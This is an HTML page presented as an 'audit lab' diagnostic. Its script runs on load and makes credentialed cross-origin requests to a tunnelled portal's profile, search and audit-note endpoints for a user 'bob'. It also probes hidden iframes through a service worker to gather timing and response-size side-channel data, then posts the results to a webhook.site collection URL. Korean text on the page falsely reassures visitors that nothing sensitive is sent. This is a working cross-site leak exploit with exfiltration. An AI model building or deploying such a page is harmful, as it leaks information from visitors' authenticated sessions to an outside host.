<!doctype html>
<html lang="ko"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Acme Audit Lab v7</title>
<style>
body{font:16px/1.5 system-ui;max-width:900px;margin:30px auto;padding:0 16px;background:#101827;color:#e8eef8}
pre{white-space:pre-wrap;overflow-wrap:anywhere;background:#0a111d;padding:14px;border:1px solid #34445d;border-radius:8px}
button{padding:10px 14px} .muted{color:#a9b7cc}
</style>
<body><h1>Acme Audit Lab v7</h1>
<p class="muted">진단은 HTTP 상태와 성능 메타데이터만 전송합니다. 쿠키, 토큰, 응답 본문은 전송하지 않습니다.</p>
<button id="run">진단 다시 실행</button><pre id="out">준비 중…</pre>
<script>
const PORTAL="https://headphones-genesis-norm-linux.trycloudflare.com";
const REPORT="https://webhook.site/a0c196fd-a120-4b70-877e-51728080435d";
const out=document.querySelector("#out");
const targets=[["profile-search-bob","search"],["profile-me","me"],["audit-note-bob","note"]];
const timing=win=>win.performance.getEntries().map(e=>({type:e.entryType,name:e.name,status:e.responseStatus,workerStart:e.workerStart,responseStart:e.responseStart,responseEnd:e.responseEnd,transferSize:e.transferSize,encodedBodySize:e.encodedBodySize,decodedBodySize:e.decodedBodySize,serverTiming:e.serverTiming?.map(s=>({name:s.name,duration:s.duration,description:s.description}))}));
async function run(){
 document.querySelector("#run").disabled=true;
 const report={page:location.href,at:new Date().toISOString(),normal:[],serviceWorker:[]};
 out.textContent="진단 중…";
 try{
  const reg=await navigator.serviceWorker.register("./sw.js?v=6",{scope:"./",updateViaCache:"none"});
  await reg.update(); await navigator.serviceWorker.ready;
  performance.clearResourceTimings();
  for(const [label,kind] of targets){
   const path=kind==="me"?"/api/profile/me":kind==="note"?"/api/profile/audit-note?employee_id=bob":"/api/profile/search?username=bob";
   try{
    const r=await fetch(PORTAL+path,{mode:"cors",credentials:"include",cache:"no-store"});
    report.normal.push({label,status:r.status});
    await r.body?.cancel();
   }catch(e){report.normal.push({label,error:String(e)});}
  }
  for(const [label,kind] of targets){
   const result=await new Promise(resolve=>{
    const frame=document.createElement("iframe");
    frame.hidden=true; document.body.appendChild(frame);
    frame.onload=()=>{
     let item={label};
     try{
      const p=frame.contentWindow.performance.getEntries().filter(e=>e.entryType==="navigation").map(e=>({status:e.responseStatus,workerStart:e.workerStart,responseStart:e.responseStart,responseEnd:e.responseEnd,transferSize:e.transferSize,encodedBodySize:e.encodedBodySize,decodedBodySize:e.decodedBodySize,serverTiming:e.serverTiming?.map(s=>({name:s.name,duration:s.duration,description:s.description}))}));
      item.performance=p;
     }catch(e){item.error=String(e);}
     frame.remove();resolve(item);
    };
    frame.onerror=()=>{frame.remove();resolve({label,error:"navigation failed"});};
    frame.src="./__sw_probe__?target="+kind+"&t="+Date.now();
   });
   report.serviceWorker.push(result);
  }
 }catch(e){report.error=String(e);}
 report.pagePerformance=timing(window);
 out.textContent=JSON.stringify(report,null,2);
 document.querySelector("#run").disabled=false;
 const safe={at:report.at,normal:report.normal,serviceWorker:report.serviceWorker,pagePerformance:report.pagePerformance.filter(e=>e.type==="resource").map(e=>({name:e.name,status:e.status,transferSize:e.transferSize,encodedBodySize:e.encodedBodySize,decodedBodySize:e.decodedBodySize,duration:e.responseEnd}))};
 fetch(REPORT,{method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain"},body:JSON.stringify(safe)}).catch(()=>{});
}
document.querySelector("#run").addEventListener("click",run);
run();
</script></body></html>
